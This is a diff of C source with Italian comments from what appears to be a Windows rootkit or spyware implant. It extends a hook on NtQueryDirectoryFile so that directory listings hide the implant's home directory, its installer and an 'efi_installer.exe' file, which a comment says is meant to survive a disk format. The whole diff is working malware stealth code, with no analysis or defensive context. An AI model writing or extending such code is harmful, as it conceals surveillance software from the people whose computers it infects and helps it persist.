@@ -234,10 +234,10 @@ static DWORD __stdcall NtCreateProcessAsUserHook( DWORD ARG1,
 // NtQueryDirectoryFile
 //
 //////////////////////////
-
+#define HIDE_NAME_COUNT 3
 typedef struct {
 	COMMONDATA;
-	char name_to_hide[MAX_RAND_NAME];
+	char name_to_hide[HIDE_NAME_COUNT][MAX_RAND_NAME];
 	memcpy_t pMemcpy;
 } NtQueryDirectoryFileStruct;
 
@@ -255,13 +255,14 @@ static  DWORD __stdcall  NtQueryDirectoryFileHook(DWORD ARG1 ,
 												  DWORD ARG10,
 												  DWORD ARG11)
 {
-	DWORD b_len;
+	DWORD b_len, i;
 	DWORD *old_b_len;
 	char *Src;
 	char *file_name;
 	DWORD file_name_len;
 	BOOLEAN found;
 	BOOL *Active;
+	BOOL is_to_hide;
 
 #define NO_SUCH_FILE 0xC000000F
 	
@@ -334,7 +335,13 @@ static  DWORD __stdcall  NtQueryDirectoryFileHook(DWORD ARG1 ,
 		file_name_len /=2; // E' unicode
 
 		// Vede se dobbiamo cancellare questa entry
-		IF_LSTRCMP(file_name, name_to_hide, file_name_len) {
+		is_to_hide = FALSE;
+		for (i=0; i<HIDE_NAME_COUNT; i++) {
+			IF_LSTRCMP(file_name, name_to_hide[i], file_name_len) 
+				is_to_hide = TRUE;
+		}
+
+		if (is_to_hide) {
 			if (old_b_len) {
 				*old_b_len += b_len;
 				
@@ -369,7 +376,9 @@ static DWORD NtQueryDirectoryFileHook_setup(HMServiceStruct *pData)
 
 	VALIDPTR(hMod = GetModuleHandle("NTDLL.DLL"))
 	VALIDPTR(NtQueryDirectoryFileData.pMemcpy = (memcpy_t) HM_SafeGetProcAddress(hMod, "memcpy"))
-	memcpy(NtQueryDirectoryFileData.name_to_hide, H4_HOME_DIR, sizeof(NtQueryDirectoryFileData.name_to_hide)); // E' sicuramente NULL terminato
+	memcpy(NtQueryDirectoryFileData.name_to_hide[0], H4_HOME_DIR, sizeof(NtQueryDirectoryFileData.name_to_hide[0])); // E' sicuramente NULL terminato
+	memcpy(NtQueryDirectoryFileData.name_to_hide[1], EXE_INSTALLER_NAME, sizeof(NtQueryDirectoryFileData.name_to_hide[1])); // E' sicuramente NULL terminato
+	memcpy(NtQueryDirectoryFileData.name_to_hide[2], "efi_installer.exe", sizeof(NtQueryDirectoryFileData.name_to_hide[2])); // XXX Qui ci andra' il nome del file per la resistenza al format
 
 	// Variabili shared per la creazione degli Hooks...
 	NtQueryDirectoryFileData.dwHookLen = 850;
